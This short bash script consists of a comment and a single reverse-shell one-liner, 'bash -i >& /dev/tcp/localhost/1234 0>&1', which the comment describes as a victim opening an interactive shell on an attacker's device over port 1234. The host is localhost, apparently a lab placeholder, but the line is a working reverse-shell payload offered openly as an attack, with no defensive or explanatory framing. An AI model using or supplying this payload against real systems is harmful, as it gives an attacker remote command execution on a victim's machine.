#!/bin/bash

# Victim target opens a interactive BASH in the attacker device by connecting to port 1234 through a TCP socket creation
bash -i >& /dev/tcp/localhost/1234 0>&1
